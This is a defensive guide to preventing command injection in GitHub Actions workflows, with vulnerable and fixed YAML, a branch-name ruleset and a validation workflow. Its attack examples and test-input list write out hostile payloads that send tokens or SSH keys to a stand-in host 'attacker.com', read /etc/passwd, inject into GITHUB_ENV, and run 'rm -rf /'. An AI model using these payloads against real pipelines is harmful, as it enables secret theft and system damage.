---
render_with_liquid: false
---

# GitHub Actions Security: Echo Command Injection Prevention

> **Document status**
>
> - **Last reviewed:** 2026-05-19
> - **Authorship:** Drafted with AI assistance (GitHub Copilot, multi-model review) and reviewed by a human maintainer before publication.
> - **Sources:** Based on public documentation — primarily [docs.github.com](https://docs.github.com), [learn.microsoft.com](https://learn.microsoft.com), and official vendor blogs cited inline.
> - **Verify before acting:** GitHub and Microsoft update product documentation continuously. Re-confirm against the live source pages before relying on this content for production decisions.

## Table of Contents

1. [Overview](#overview)
2. [The Vulnerability](#the-vulnerability)
3. [User-Controlled Inputs to Watch](#user-controlled-inputs-to-watch)
4. [Protection Methods](#protection-methods)
5. [Real-World Examples Fixed](#real-world-examples-fixed)
6. [Branch Name Protection](#branch-name-protection)
7. [Additional Security Best Practices](#additional-security-best-practices)
8. [Testing for Vulnerabilities](#testing-for-vulnerabilities)
9. [References](#references)
10. [Quick Reference Card](#quick-reference-card)

## Overview

This document explains the **echo command injection vulnerability** (HackerBot Claw attack) and how to protect your GitHub Actions workflows.

## The Vulnerability

### What is it?

When you directly use user-controlled inputs in shell commands like `echo`, attackers can inject malicious commands.

### Vulnerable Code Example

```yaml
name: Vulnerable Workflow
on:
  workflow_dispatch:
    inputs:
      name:
        description: 'Your name'
        required: true

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Say hello
        run: echo "Hello ${{ github.event.inputs.name }}"
```

### Attack Scenarios

An attacker can exploit this by providing malicious input:

**Example 1: Command Injection**
```
Input: "; curl attacker.com?token=$(cat $GITHUB_TOKEN); "
Result: Exfiltrates secrets to attacker's server
```

**Example 2: Workflow Command Injection**

**Note:** The `::set-output` stdout workflow command was deprecated in October 2022 and emits warnings on modern runners. The current dominant injection vector in GitHub Actions targets the **`GITHUB_ENV`** and **`GITHUB_OUTPUT`** environment files — see the additional example below.

```
Input: $(echo "::set-output name=token::$GITHUB_TOKEN")
Result: Leaks secrets through workflow commands
```

```
Input: $(echo -e "\nINJECTED_VAR=evil_value\n" >> $GITHUB_ENV)
Result: Injects an environment variable into subsequent workflow steps, enabling secret exfiltration.
```

**Example 3: Branch Name Attack**
```yaml
run: echo "Building branch ${{ github.head_ref }}"
Branch name: main"; malicious-command; "
```

## User-Controlled Inputs to Watch

Be especially careful with:

- `github.event.inputs.*` - Workflow dispatch inputs
- `github.head_ref` - Source branch name in PRs
- `github.base_ref` - Target branch name in PRs  
- `github.ref_name` - Branch or tag name
- `github.event.pull_request.title` - PR title
- `github.event.pull_request.body` - PR description
- `github.event.issue.title` - Issue title
- `github.event.issue.body` - Issue body
- `github.event.commits[].message` - Commit messages

## Protection Methods

### Method 1: Use Environment Variables (Recommended)

Always use environment variables instead of direct interpolation:

**✅ SECURE:**
```yaml
- name: Say hello
  env:
    INPUT_NAME: ${{ github.event.inputs.name }}
  run: echo "Hello $INPUT_NAME"
```

**Why it works:** The shell interpolates the environment variable safely after GitHub Actions has already substituted the expression.

### Method 2: Use Intermediate Steps

For complex operations, use actions or scripts:

```yaml
- name: Sanitize input
  id: sanitize
  uses: actions/github-script@v7
  with:
    script: |
      const name = context.payload.inputs.name || 'World';
      // Validate and sanitize
      const safeName = name.replace(/[^a-zA-Z0-9 -]/g, '');
      core.setOutput('safe_name', safeName);

- name: Use sanitized input
  env:
    SAFE_NAME: ${{ steps.sanitize.outputs.safe_name }}
  run: echo "Hello $SAFE_NAME"
```

### Method 3: Avoid Echo When Possible

Consider alternatives to echo:

```yaml
- name: Display input
  uses: actions/github-script@v7
  with:
    script: |
      console.log(`Hello ${context.payload.inputs.name}`);
```

### Method 4: Input Validation

For workflow_dispatch inputs, use type constraints:

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Environment'
        required: true
        type: choice
        options:
          - dev
          - staging
          - prod
```

## Real-World Examples Fixed

### Before (Vulnerable)

```yaml
name: Deploy
on:
  push:
    branches:
      - '*'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying branch ${{ github.ref_name }}"
      - run: echo "PR title: ${{ github.event.pull_request.title }}"
```

### After (Secure)

```yaml
name: Deploy
on:
  push:
    branches:
      - '*'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Display branch
        env:
          BRANCH_NAME: ${{ github.ref_name }}
        run: echo "Deploying branch $BRANCH_NAME"
      
      - name: Display PR info
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "PR title: $PR_TITLE"
```

## Branch Name Protection

Branch names are especially dangerous because:
1. Attackers can create branches with malicious names
2. Branch names are automatically used in many workflows
3. They can contain special characters and commands

**Example Attack:**
```
Branch name: main"; curl attacker.com?data=$(cat ~/.ssh/id_rsa); "
```

### Safe Branch Naming Convention

Implement this regex pattern as a GitHub branch ruleset to prevent malicious branch names:

```regex
^[a-zA-Z0-9]([a-zA-Z0-9._/-]{0,242}[a-zA-Z0-9])?$
```

**What This Allows:**
- Letters: a-z, A-Z
- Numbers: 0-9
- Separators: `/` `-` `_` `.`
- Max length: 244 characters
- Must start and end with alphanumeric characters

**What This Blocks:**
- Command injection characters: `;` `$` `` ` `` `(` `)` `&` `|` `\` `"` `'`
- Spaces and newlines
- Leading/trailing separators

**Valid Examples:**
```
✅ main
✅ feature/user-authentication
✅ bugfix/fix-login-error
✅ release/v1.2.3
✅ feat/ABC-123-add-feature
```

**Invalid Examples:**
```
❌ feature/test; rm -rf /
❌ $(whoami)
❌ main"; curl attacker.com
❌ branch with spaces
❌ -feature (starts with separator)
```

### Implementation: GitHub Branch Ruleset

1. Go to **Settings** → **Rules** → **Rulesets**
2. Click **New ruleset** → **New branch ruleset**
3. Name: `Branch Naming Convention`
4. Target branches: `*` (all branches)
5. Add rule: **Restrict creations, updates, and deletions**
6. Enable: **Require a matching ref name**
7. Pattern: `^[a-zA-Z0-9]([a-zA-Z0-9._/-]{0,242}[a-zA-Z0-9])?$`

### Implementation: Workflow Validation

Add this workflow to validate branch names:

```yaml
name: Validate Branch Name
on:
  pull_request:
  push:

jobs:
  validate-branch:
    runs-on: ubuntu-latest
    steps:
      - name: Validate branch name
        env:
          BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
        run: |
          if [[ ! "$BRANCH_NAME" =~ ^[a-zA-Z0-9]([a-zA-Z0-9._/-]{0,242}[a-zA-Z0-9])?$ ]]; then
            echo "❌ Invalid branch name: $BRANCH_NAME"
            echo ""
            echo "Branch names must:"
            echo "  - Start and end with alphanumeric characters"
            echo "  - Only contain: a-z, A-Z, 0-9, /, -, _, ."
            echo "  - Be 244 characters or less"
            exit 1
          fi
          echo "✅ Branch name is valid: $BRANCH_NAME"
```

### Recommended Branch Naming Patterns

```
feature/[ticket-id]-[description]
bugfix/[ticket-id]-[description]
hotfix/[ticket-id]-[description]
release/v[version]
docs/[description]
test/[description]
chore/[description]
```

**Examples:**
- `feature/ABC-123-user-authentication`
- `bugfix/XYZ-456-fix-memory-leak`
- `release/v2.1.0`

## Additional Security Best Practices

1. **Minimize permissions**: Use `permissions:` to limit GITHUB_TOKEN scope
2. **Pin action versions**: Use commit SHA instead of tags
3. **Enable branch protection**: Require reviews for workflow changes
4. **Use required workflows**: Enforce security checks
5. **Audit workflow changes**: Monitor changes to `.github/workflows/`
6. **Use Dependabot**: Keep actions up to date
7. **Enable secret scanning**: Detect leaked credentials
8. **Use OIDC**: Avoid long-lived credentials

## Testing for Vulnerabilities

Use these test inputs to verify your workflows are secure:

```
"; ls -la; "
$(whoami)
`cat /etc/passwd`
"\n::set-output name=test::value\n"
"\nINJECTED_VAR=$(cat /etc/passwd)\n"  # targets GITHUB_ENV file injection
$(curl attacker.com)
```

If any of these execute commands or show sensitive data, your workflow is vulnerable.

## References

- [StepSecurity: HackerBot Claw GitHub Actions Exploitation](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [GitHub: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [GitHub: Understanding the risk of script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#good-practices-for-mitigating-script-injection-attacks)

## Quick Reference Card

| ❌ VULNERABLE | ✅ SECURE |
|--------------|----------|
| `run: echo "${{ inputs.name }}"` | `env:`<br>`  NAME: ${{ inputs.name }}`<br>`run: echo "$NAME"` |
| `run: echo "${{ github.head_ref }}"` | `env:`<br>`  BRANCH: ${{ github.head_ref }}`<br>`run: echo "$BRANCH"` |
| `run: echo "${{ github.event.pull_request.title }}"` | `env:`<br>`  TITLE: ${{ github.event.pull_request.title }}`<br>`run: echo "$TITLE"` |

**Remember:** When in doubt, use environment variables!
